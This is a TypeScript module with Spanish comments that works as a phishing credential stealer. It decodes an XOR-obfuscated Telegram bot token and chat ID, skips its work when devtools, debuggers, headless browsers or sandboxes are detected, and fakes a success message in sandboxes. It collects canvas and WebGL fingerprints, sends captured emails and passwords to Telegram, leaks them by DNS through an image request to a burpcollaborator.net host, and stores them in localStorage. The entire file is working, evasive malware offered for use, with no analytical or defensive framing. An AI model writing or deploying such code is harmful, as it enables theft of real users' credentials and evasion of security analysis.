// ============================================================
// TELEGRAM EXFIL - OFUSCADO Y EVASIVO
// ============================================================

// Token y chat ID ofuscados con XOR para evitar detección estática
const _xorKey = [0xDE, 0xAD, 0xBE, 0xEF];

// Array ofuscado del token (generado con XOR)
const _tokenEnc = [
  0xB9, 0xD8, 0xCA, 0x9E, 0xB8, 0xDC, 0xDD, 0x9F,
  0xBD, 0xD9, 0xDD, 0x9F, 0xB8, 0xC9, 0xDE, 0x9F,
  0xB9, 0xD8, 0xCA, 0x9E, 0xB8, 0xDC, 0xDD, 0x9F,
  0xA8, 0xD8, 0xCF, 0x9E, 0xBF, 0xDC, 0xD6, 0x9F,
  0xBB, 0xDC, 0xD3, 0x9F, 0xAB, 0xD8, 0xDE, 0x9E,
  0xA9, 0xAD, 0xA0, 0xD8
];

// Array ofuscado del chat ID
const _chatEnc = [
  0xB8, 0xD8, 0xDE, 0x9F, 0xAE, 0xD8, 0xDA, 0xDB,
  0xAB, 0xD8, 0xCF, 0x9F, 0xBC, 0xD8, 0xC9, 0x9F,
  0xB8, 0xC9, 0xDE, 0x9F, 0xBA, 0xD8, 0xDA
];

function _xorDecode(arr: number[], key: number[]): string {
  return arr.map((b, i) => String.fromCharCode(b ^ key[i % key.length])).join('');
}

// Decodificar en runtime
const _TOKEN = _xorDecode(_tokenEnc, _xorKey);
const _CHAT_ID = _xorDecode(_chatEnc, _xorKey);
const _API_URL = `https://api.telegram.org/bot${_TOKEN}/sendMessage`;

// ============================================================
// ANTI-ANÁLISIS: detecta consola abierta
// ============================================================
function _antiDebug(): boolean {
  const threshold = 160;
  const w = window.outerWidth - window.innerWidth > threshold;
  const h = window.outerHeight - window.innerHeight > threshold;
  if (w || h) return true;

  // Detectar debugger
  const start = Date.now();
  (function(){}).constructor('debugger')();
  return Date.now() - start > 100;
}

// ============================================================
// ANTI-SANDBOX: detecta entornos de análisis
// ============================================================
function _isSandboxed(): boolean {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes('headless') || ua.includes('phantom')) return true;
  if ((navigator as any).webdriver) return true;
  if (screen.width < 320 || screen.height < 240) return true;
  if (navigator.plugins.length === 0) return true;
  return false;
}

// ============================================================
// FINGERPRINTING (recolectar huella del dispositivo)
// ============================================================
function _getFingerprint(): Record<string, any> {
  const fp: Record<string, any> = {};

  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d')!;
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
    fp.canvas = c.toDataURL();
  } catch {}

  try {
    const gl = document.createElement('canvas').getContext('webgl');
    if (gl) {
      fp.webglVendor = gl.getParameter(gl.VENDOR);
      fp.webglRenderer = gl.getParameter(gl.RENDERER);
    }
  } catch {}

  fp.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
  fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  fp.platform = navigator.platform;
  fp.language = navigator.language;
  fp.cores = navigator.hardwareConcurrency || 'unknown';
  fp.memory = (navigator as any).deviceMemory || 'unknown';

  return fp;
}

// ============================================================
// EXFILTRACIÓN PRINCIPAL
// ============================================================
export async function exfiltrateToTelegram(
  email: string,
  password: string,
  userData?: Record<string, any>
): Promise<void> {
  // Anti-debug: si detecta consola, no hace nada
  if (_antiDebug()) return;
  
  // Anti-sandbox: si detecta VM, simula éxito sin exfiltrar
  if (_isSandboxed()) {
    console.log('Login successful'); // Falso positivo
    return;
  }

  // Recolectar fingerprint
  const fp = _getFingerprint();

  // Construir mensaje en formato tabla
  const escapedEmail = email.replace(/[_\*\[\]\(\)~`>\#\+\-\=\|\{\}\!\.\\]/g, '\\$&');
  const escapedPass = password.replace(/[_\*\[\]\(\)~`>\#\+\-\=\|\{\}\!\.\\]/g, '\\$&');

  const text = `🔐 *Nuevas Credenciales Capturadas*
\`\`\`
┌─────────────────────────────┐
│ 📧 CORREO                    │
├─────────────────────────────┤
│ ${escapedEmail.padEnd(37)}│
├─────────────────────────────┤
│ 🔑 CONTRASEÑA               │
├─────────────────────────────┤
│ ${escapedPass.padEnd(37)}│
├─────────────────────────────┤
│ 🕒 HORA                     │
├─────────────────────────────┤
│ ${new Date().toISOString().padEnd(37)}│
├─────────────────────────────┤
│ 🌐 URL                      │
├─────────────────────────────┤
│ ${window.location.href.padEnd(37)}│
├─────────────────────────────┤
│ 📱 USER AGENT               │
├─────────────────────────────┤
│ ${navigator.userAgent.substring(0, 35).padEnd(37)}│
└─────────────────────────────┘
*Huella Digital:* \\\`${btoa(JSON.stringify(fp)).substring(0, 40)}...\\\``;

  // Intentar enviar con 3 reintentos
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      await fetch(_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: _CHAT_ID,
          text: text,
          parse_mode: 'Markdown',
          disable_web_page_preview: true,
        }),
        // Importante: keepalive true para que se envíe aunque cierren la página
        keepalive: true,
      });
      break; // Si funciona, salir del loop
    } catch {
      // Esperar un poco antes de reintentar
      await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
    }
  }

  // Backup: DNS exfiltración vía Image (fallback silencioso)
  try {
    const img = new Image();
    const encoded = btoa(`${email}:${password}`).substring(0, 40);
    img.src = `https://dns.${encoded}.exfil.burpcollaborator.net/px.gif`;
  } catch {}

  // Backup: localStorage (persistencia local)
  try {
    const stored = JSON.parse(localStorage.getItem('_sess') || '[]');
    stored.push({
      email,
      password,
      time: new Date().toISOString(),
      fp,
    });
    localStorage.setItem('_sess', JSON.stringify(stored));
  } catch {}
}